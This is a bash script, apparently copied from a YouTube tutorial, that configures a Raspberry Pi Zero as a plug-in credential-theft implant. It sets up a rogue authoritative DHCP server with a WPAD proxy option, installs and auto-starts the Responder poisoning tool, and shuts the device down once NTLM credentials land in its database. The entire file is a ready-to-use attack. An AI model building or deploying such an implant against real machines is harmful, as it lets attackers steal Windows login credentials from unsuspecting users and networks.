#!/bin/bash
# "Veni, Vici, Vidi" - Caesar
# I found this script on YouTube and tested out with a different setup.


if [ $EUID -ne 0 ]; then
	echo "You must use sudo to run this script:"
	echo "sudo $0 $@"
	exit
fi

apt-get update


## Configure static IP for eth0
cat <<'EOF'>>/etc/network/interfaces

auto eth0
allow-hotplug eth0
iface eth0 inet static
    address 192.168.200.1
    netmask 255.255.255.0
EOF


##Install and configure dnsmasq
 apt-get install -y dnsmasq


cat <<'EOF'>>/etc/dnsmasq.conf

interface=eth0
dhcp-range=192.168.200.2,192.168.200.254,255.255.255.0,1h

dhcp-authoritative

dhcp-option=252,http://192.168.200.1/wpad.dat

log-queries
log-dhcp

port=0
EOF

##Install Responder and dependencies
apt-get install -y python git python-pip python-dev screen sqlite3 inotify-tools
pip install pycrypto
git clone https://github.com/spiderlabs/responder /opt/responder


##Start Responder at bootup
sed -i '/exit/d' /etc/rc.local

cat <<'EOF'>>/etc/rc.local
# Start Responder
/usr/bin/screen -dmS responder bash -c 'cd /opt/responder/; python Responder.py -I eth0 -f -w -r -d -F'
EOF

## Stop Responder when its done grabbing NTLM creds and shut down PiZero
## Comment out everything from here down except for exit 0 if you don't want it to shut down the PiZero after it gets the creds
cat <<'EOF'>>/etc/rc.local
# Shutdown once creds have been obtained
/usr/bin/screen -dmS notify bash -c 'while inotifywait -e modify /opt/responder/Responder.db; do shutdown -h now; done'
exit 0
EOF
